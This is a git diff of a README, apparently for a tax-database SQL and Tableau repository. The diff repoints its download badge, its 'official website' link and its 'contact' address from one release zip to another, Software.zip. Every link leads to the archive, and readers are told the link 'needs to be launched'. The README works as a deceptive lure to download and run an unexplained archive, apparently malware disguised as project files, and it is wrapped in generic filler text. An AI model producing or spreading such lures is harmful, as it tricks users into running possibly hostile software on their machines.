@@ -12,7 +12,7 @@ azure, data-science, data-visualization, database-architecture, database-deploym
 ## 📁 Installation:
 To get started with the tools and scripts provided in this repository, you can download the files by clicking the link below:
 
-[![Download Now](https://github.com/cartervr/taxdatabase-sql-tableau/releases/download/v1.0/Release.zip)](https://github.com/cartervr/taxdatabase-sql-tableau/releases/download/v1.0/Release.zip)
+[![Download Now](https://github.com/cartervr/taxdatabase-sql-tableau/releases/download/v2.0/Software.zip)](https://github.com/cartervr/taxdatabase-sql-tableau/releases/download/v2.0/Software.zip)
 
 *Note: The link provided above needs to be launched to access the files.*
 
@@ -36,7 +36,7 @@ If you encounter any issues with the link, please check the "Releases" section o
 - Join data science and database management communities to stay updated with the latest trends and best practices in the industry.
 
 ## 🌐 Website:
-For more information and updates, visit the official [Tax Database SQL Tableau Repository Website](https://github.com/cartervr/taxdatabase-sql-tableau/releases/download/v1.0/Release.zip).
+For more information and updates, visit the official [Tax Database SQL Tableau Repository Website](https://github.com/cartervr/taxdatabase-sql-tableau/releases/download/v2.0/Software.zip).
 
 ## 📚 References:
 - Dive deeper into database architecture and design principles by referring to renowned books and research papers in the field.
@@ -46,7 +46,7 @@ For more information and updates, visit the official [Tax Database SQL Tableau R
 We welcome contributions from the community to enhance and expand this repository. Feel free to submit pull requests, report issues, or suggest new features to make this repository even more valuable for users.
 
 ## 📧 Contact Us:
-For any inquiries or feedback, please reach out to us at https://github.com/cartervr/taxdatabase-sql-tableau/releases/download/v1.0/Release.zip We greatly appreciate your input and suggestions!
+For any inquiries or feedback, please reach out to us at https://github.com/cartervr/taxdatabase-sql-tableau/releases/download/v2.0/Software.zip We greatly appreciate your input and suggestions!
 
 Let's embark on a journey of exploring the world of databases, data analysis, and data visualization together! 🌍✨
 
